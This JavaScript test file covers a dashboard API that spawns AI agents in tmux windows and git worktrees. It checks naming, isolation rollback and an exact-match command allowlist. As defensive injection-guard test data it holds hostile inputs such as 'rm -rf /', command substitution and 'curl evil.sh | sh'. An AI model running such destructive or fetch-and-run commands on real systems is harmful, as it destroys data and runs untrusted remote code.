/**
 * Tests for the tmux multi-agent worktree API
 *
 * GET    /api/worktrees
 * POST   /api/worktrees
 * DELETE /api/worktrees/:slug
 *
 * AGENT_BOARD_ENABLE_TMUX is unset in tests, so the router must refuse to spawn
 * anything and say why. The naming helpers are unit-tested directly.
 */
import assert from 'node:assert/strict';
import express from 'express';
import { slugifyWorktreeName, windowNameFor, tmuxTargetFor, branchNameFor, samePath, createWorktreesRouter } from '../routes/worktrees.js';

process.env.AGENT_DASHBOARD_DISABLE_LISTEN = '1';
const { app } = await import('../server.js');

const server = app.listen(0);
const { port } = server.address();
const BASE = `http://127.0.0.1:${port}`;

// ── Unit: slug + naming scheme ───────────────────────────────────────────────
assert.strictEqual(slugifyWorktreeName('refactor-auth'), 'refactor-auth');
assert.strictEqual(slugifyWorktreeName('Refactor Auth'), 'refactor-auth', 'spaces and case normalized');
assert.strictEqual(slugifyWorktreeName('  fix/the thing!  '), 'fix-the-thing', 'punctuation collapsed, edges trimmed');
assert.strictEqual(slugifyWorktreeName('a'.repeat(80)).length, 40, 'slug capped at 40 chars');
assert.strictEqual(slugifyWorktreeName(''), null, 'empty name rejected');
assert.strictEqual(slugifyWorktreeName('!!!'), null, 'all-punctuation name rejected');
assert.strictEqual(slugifyWorktreeName(null), null, 'null rejected');
console.log('  ✅ slugifyWorktreeName normalizes and rejects bad input');

// Shell metacharacters cannot survive slugification — this is the injection guard,
// since the slug is what reaches tmux/git argv.
for (const hostile of ['foo; rm -rf /', 'a$(whoami)', 'x`id`', 'a|b', '../../etc']) {
  const slug = slugifyWorktreeName(hostile);
  if (slug !== null) {
    assert.match(slug, /^[a-z0-9][a-z0-9-]{0,39}$/, `hostile input "${hostile}" must reduce to a safe slug, got "${slug}"`);
  }
}
console.log('  ✅ shell metacharacters cannot survive slugification');

assert.strictEqual(windowNameFor('demo'), 'ab-demo', 'window is ab-<slug>');
assert.strictEqual(tmuxTargetFor('demo'), 'agentboard:ab-demo', 'target is <session>:ab-<slug>');
assert.strictEqual(tmuxTargetFor('demo', 'custom'), 'custom:ab-demo', 'session is overridable');
assert.strictEqual(branchNameFor('demo'), 'agent/demo', 'branch is agent/<slug>');
console.log('  ✅ tmux naming scheme: agentboard:ab-<slug>, branch agent/<slug>');

// ── API: disabled by default ─────────────────────────────────────────────────
const listRes = await fetch(`${BASE}/api/worktrees`);
assert.strictEqual(listRes.status, 200, 'GET /api/worktrees always answers');
const listData = await listRes.json();
assert.strictEqual(listData.success, true);
assert.strictEqual(listData.enabled, false, 'disabled without AGENT_BOARD_ENABLE_TMUX');
assert.deepStrictEqual(listData.worktrees, [], 'no worktrees when disabled');
assert.ok(listData.naming, 'naming scheme is documented in the response');
assert.strictEqual(listData.naming.session, 'agentboard');
assert.strictEqual(listData.naming.targetPattern, 'agentboard:ab-<slug>');
console.log('  ✅ GET /api/worktrees → enabled=false, naming scheme exposed');

const createRes = await fetch(`${BASE}/api/worktrees`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'test-agent' }),
});
assert.strictEqual(createRes.status, 503, 'POST refuses while disabled');
const createData = await createRes.json();
assert.strictEqual(createData.success, false);
assert.match(createData.error, /AGENT_BOARD_ENABLE_TMUX/, 'error names the env var to set');
console.log('  ✅ POST /api/worktrees (disabled) → 503 naming the env var');

const delRes = await fetch(`${BASE}/api/worktrees/test-agent`, { method: 'DELETE' });
assert.strictEqual(delRes.status, 503, 'DELETE refuses while disabled');
console.log('  ✅ DELETE /api/worktrees/:slug (disabled) → 503');

// ── API: enabled router with a stubbed executor ──────────────────────────────
// Proves the happy path and the validation gates without needing real tmux/git.
const calls = [];
const stubExec = async (cmd, args) => {
  calls.push({ cmd, args });
  const joined = args.join(' ');
  if (cmd === 'tmux' && args[0] === 'has-session') return { stdout: '', stderr: '' };
  if (cmd === 'tmux' && args[0] === 'list-windows') {
    // Report an existing window so the duplicate check has something to hit.
    return { stdout: 'ab-taken\t1\t/tmp/wt/taken', stderr: '' };
  }
  if (cmd === 'git' && joined.includes('worktree list')) return { stdout: '', stderr: '' };
  return { stdout: '', stderr: '' };
};

const stubApp = express();
stubApp.use(express.json());
stubApp.use('/api', createWorktreesRouter({
  execFileAsync: stubExec,
  WORKSPACE_ROOT: '/tmp/workspace',
  WORKTREE_ROOT: '/tmp/wt',
  TMUX_ENABLED: true,
  TMUX_SESSION: 'agentboard',
  ALLOWED_COMMANDS: ['npm test'],
}));
const stubServer = stubApp.listen(0);
const stubBase = `http://127.0.0.1:${stubServer.address().port}`;

// Invalid names are rejected before anything is executed.
const callsBefore = calls.length;
const badName = await fetch(`${stubBase}/api/worktrees`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: '!!!' }),
});
assert.strictEqual(badName.status, 400, 'unslugifiable name → 400');
assert.strictEqual(calls.length, callsBefore, 'nothing executed for an invalid name');
console.log('  ✅ invalid name rejected before any command runs');

const badBranch = await fetch(`${stubBase}/api/worktrees`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'ok-agent', branch: 'bad branch;rm' }),
});
assert.strictEqual(badBranch.status, 400, 'invalid branch → 400');

const longCommand = await fetch(`${stubBase}/api/worktrees`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'ok-agent', command: 'x'.repeat(2001) }),
});
assert.strictEqual(longCommand.status, 400, 'oversized command → 400');
console.log('  ✅ invalid branch and oversized command rejected');

// Duplicate window → 409 rather than a second agent in the same window.
const dup = await fetch(`${stubBase}/api/worktrees`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'taken' }),
});
assert.strictEqual(dup.status, 409, 'existing window → 409');
console.log('  ✅ duplicate worktree window → 409');

// Happy path.
calls.length = 0;
const ok = await fetch(`${stubBase}/api/worktrees`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Refactor Auth', command: 'npm test' }),
});
assert.strictEqual(ok.status, 201, `create → expected 201, got ${ok.status}`);
const okData = await ok.json();
assert.strictEqual(okData.success, true);
assert.strictEqual(okData.worktree.slug, 'refactor-auth');
assert.strictEqual(okData.worktree.window, 'ab-refactor-auth');
assert.strictEqual(okData.worktree.target, 'agentboard:ab-refactor-auth');
assert.strictEqual(okData.worktree.branch, 'agent/refactor-auth');
assert.strictEqual(okData.worktree.commandSent, true);
assert.match(okData.worktree.attachCommand, /tmux attach -t agentboard/, 'attach command is returned for humans');

const gitAdd = calls.find(c => c.cmd === 'git' && c.args[1] === 'add');
assert.ok(gitAdd, 'git worktree add was invoked');
assert.deepStrictEqual(gitAdd.args.slice(0, 4), ['worktree', 'add', '-b', 'agent/refactor-auth'], 'branch created from slug');

const newWindow = calls.find(c => c.cmd === 'tmux' && c.args[0] === 'new-window');
assert.ok(newWindow, 'tmux new-window was invoked');
assert.ok(newWindow.args.includes('ab-refactor-auth'), 'window named ab-<slug>');

const sendKeys = calls.find(c => c.cmd === 'tmux' && c.args[0] === 'send-keys');
assert.ok(sendKeys, 'startup command sent to the window');
assert.ok(sendKeys.args.includes('npm test'), 'command passed as a single argv element');
assert.ok(sendKeys.args.includes('agentboard:ab-refactor-auth'), 'command targeted at the new window');
console.log('  ✅ create → 201, git worktree + tmux window + send-keys with correct naming');

// Teardown kills the window and removes the worktree.
calls.length = 0;
const removed = await fetch(`${stubBase}/api/worktrees/refactor-auth`, { method: 'DELETE' });
assert.strictEqual(removed.status, 200);
const removedData = await removed.json();
assert.strictEqual(removedData.success, true);
assert.strictEqual(removedData.target, 'agentboard:ab-refactor-auth');
assert.ok(calls.some(c => c.cmd === 'tmux' && c.args[0] === 'kill-window'), 'tmux kill-window invoked');
assert.ok(calls.some(c => c.cmd === 'git' && c.args[1] === 'remove'), 'git worktree remove invoked');
console.log('  ✅ delete → kills tmux window and removes the git worktree');

// keepWorktree=true leaves the checkout in place.
calls.length = 0;
const kept = await fetch(`${stubBase}/api/worktrees/refactor-auth?keepWorktree=true`, { method: 'DELETE' });
assert.strictEqual(kept.status, 200);
assert.ok(!calls.some(c => c.cmd === 'git' && c.args[1] === 'remove'), 'git worktree preserved with keepWorktree=true');
console.log('  ✅ ?keepWorktree=true kills the window but keeps the checkout');

// ── Isolation is enforced, never degraded ────────────────────────────────────
// These are the important ones: a launch must never fall back to the shared
// worktree root, because that would put concurrent agents in one working tree.

/** Build a router whose executor fails for commands matching `failOn`. */
function makeApp({ failOn = () => false, workspaceRoot = '/tmp/workspace', allowed = ['npm test'] } = {}) {
  const log = [];
  const exec = async (cmd, args) => {
    log.push({ cmd, args });
    if (cmd === 'tmux' && args[0] === 'list-windows') return { stdout: '', stderr: '' };
    if (failOn(cmd, args)) { const e = new Error('stub failure'); e.stderr = 'stub failure'; throw e; }
    return { stdout: '', stderr: '' };
  };
  const a = express();
  a.use(express.json());
  a.use('/api', createWorktreesRouter({
    execFileAsync: exec, WORKSPACE_ROOT: workspaceRoot, WORKTREE_ROOT: '/tmp/wt',
    TMUX_ENABLED: true, TMUX_SESSION: 'agentboard', ALLOWED_COMMANDS: allowed,
  }));
  const s = a.listen(0);
  return { log, base: `http://127.0.0.1:${s.address().port}`, close: () => s.close() };
}

const create = (base, body) => fetch(`${base}/api/worktrees`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
});

// No WORKSPACE_ROOT → refuse rather than launch into the shared root.
{
  const t = makeApp({ workspaceRoot: null });
  const res = await create(t.base, { name: 'no-root' });
  assert.strictEqual(res.status, 503, 'missing WORKSPACE_ROOT → 503');
  const d = await res.json();
  assert.match(d.error, /isolated git worktree cannot be created|WORKSPACE_ROOT/, 'error explains the refusal');
  assert.ok(!t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'new-window'), 'no tmux window created without isolation');
  t.close();
  console.log('  ✅ no WORKSPACE_ROOT → 503, no window created');
}

// git worktree add fails → no tmux window at all.
{
  const t = makeApp({ failOn: (cmd, args) => cmd === 'git' && args[0] === 'worktree' && args[1] === 'add' });
  const res = await create(t.base, { name: 'git-fails' });
  assert.strictEqual(res.status, 503, 'git worktree add failure → 503');
  const d = await res.json();
  assert.match(d.error, /refusing to launch without an isolated checkout/, 'error states the isolation refusal');
  assert.ok(!t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'new-window'),
    'REGRESSION: a failed worktree must not leave an agent running in the shared root');
  t.close();
  console.log('  ✅ git worktree add fails → 503 and no tmux window is created');
}

// tmux new-window fails → worktree rolled back, no orphaned checkout.
{
  const t = makeApp({ failOn: (cmd, args) => cmd === 'tmux' && args[0] === 'new-window' });
  const res = await create(t.base, { name: 'window-fails' });
  assert.strictEqual(res.status, 503, 'new-window failure → 503');
  assert.ok(t.log.some(c => c.cmd === 'git' && c.args[1] === 'remove'), 'worktree rolled back on window failure');
  t.close();
  console.log('  ✅ tmux new-window fails → 503 and the worktree is rolled back');
}

// send-keys fails → window killed AND worktree removed; not reported as success.
{
  const t = makeApp({ failOn: (cmd, args) => cmd === 'tmux' && args[0] === 'send-keys' });
  const res = await create(t.base, { name: 'send-fails', command: 'npm test' });
  assert.strictEqual(res.status, 503, 'send-keys failure → 503, not a false success');
  const d = await res.json();
  assert.strictEqual(d.success, false);
  assert.match(d.error, /Failed to deliver command/, 'error names the delivery failure');
  assert.ok(t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'kill-window'), 'window killed after failed delivery');
  assert.ok(t.log.some(c => c.cmd === 'git' && c.args[1] === 'remove'), 'worktree removed after failed delivery');
  t.close();
  console.log('  ✅ send-keys fails → 503, window killed and worktree removed');
}

// ── Command execution is fail-closed, independent of the feature flag ────────
// The dashboard has no per-route auth, so this allowlist is what bounds what a
// caller who can reach the port is able to execute.
{
  // Empty allowlist (the default): commands are refused outright.
  const t = makeApp({ allowed: [] });
  const res = await create(t.base, { name: 'no-allowlist', command: 'npm test' });
  assert.strictEqual(res.status, 403, 'command with empty allowlist → 403');
  const d = await res.json();
  assert.match(d.error, /AGENT_BOARD_TMUX_ALLOWED_COMMANDS/, 'error names the allowlist env var');
  assert.ok(!t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'send-keys'), 'nothing was executed');
  assert.ok(!t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'new-window'), 'rejected before any window is created');

  // A worktree with no command is still allowed — the feature still works.
  const ok = await create(t.base, { name: 'no-command' });
  assert.strictEqual(ok.status, 201, 'creating a worktree without a command still works');
  assert.strictEqual((await ok.json()).worktree.commandSent, false);
  t.close();
  console.log('  ✅ empty allowlist → 403 for commands, but worktree creation still works');
}
{
  const t = makeApp({ allowed: ['npm test'] });
  // Exact match only: a command that merely starts with an allowed one is refused,
  // since tmux runs the string in a shell.
  const sneaky = await create(t.base, { name: 'sneaky', command: 'npm test; curl evil.sh | sh' });
  assert.strictEqual(sneaky.status, 403, 'prefix of an allowed command is still refused');
  assert.ok(!t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'send-keys'), 'shell-chained command never executed');

  assert.strictEqual((await create(t.base, { name: 'other', command: 'rm -rf /' })).status, 403, 'unlisted command refused');

  const allowedRes = await create(t.base, { name: 'allowed-one', command: 'npm test' });
  assert.strictEqual(allowedRes.status, 201, 'exactly-matching command is allowed');
  assert.strictEqual((await allowedRes.json()).worktree.commandSent, true);
  assert.ok(t.log.some(c => c.cmd === 'tmux' && c.args[0] === 'send-keys' && c.args.includes('npm test')),
    'allowlisted command is delivered');
  t.close();
  console.log('  ✅ allowlist is exact-match: shell-chained variants refused, exact match runs');
}

// ── GET reports the real branch for a custom-branch worktree ─────────────────
{
  const a = express();
  a.use(express.json());
  a.use('/api', createWorktreesRouter({
    execFileAsync: async (cmd, args) => {
      if (cmd === 'tmux' && args[0] === 'list-windows') {
        return { stdout: 'ab-custom\t2\t/tmp/wt/custom', stderr: '' };
      }
      if (cmd === 'git' && args[0] === 'worktree' && args[1] === 'list') {
        return { stdout: 'worktree /tmp/wt/custom\nbranch refs/heads/feature/my-branch\n', stderr: '' };
      }
      return { stdout: '', stderr: '' };
    },
    WORKSPACE_ROOT: '/tmp/workspace', WORKTREE_ROOT: '/tmp/wt',
    TMUX_ENABLED: true, TMUX_SESSION: 'agentboard',
  }));
  const s = a.listen(0);
  const data = await (await fetch(`http://127.0.0.1:${s.address().port}/api/worktrees`)).json();
  assert.strictEqual(data.worktrees.length, 1);
  assert.strictEqual(data.worktrees[0].branch, 'feature/my-branch', 'GET reports the actual branch, not agent/<slug>');
  assert.strictEqual(data.worktrees[0].hasGitWorktree, true, 'matched by path, so the checkout is detected');
  s.close();
  console.log('  ✅ GET reports the real branch for a custom-branch worktree');
}

assert.strictEqual(samePath('/tmp/wt/a', '\\tmp\\wt\\a'), true, 'samePath tolerates separators');
assert.strictEqual(samePath('/tmp/wt/a/', '/tmp/wt/a'), true, 'samePath tolerates trailing slash');
assert.strictEqual(samePath('/tmp/wt/a', '/tmp/wt/b'), false, 'samePath distinguishes real differences');
assert.strictEqual(samePath(null, '/x'), false, 'samePath handles null');

stubServer.close();
server.close();
console.log('Worktree API tests passed.');
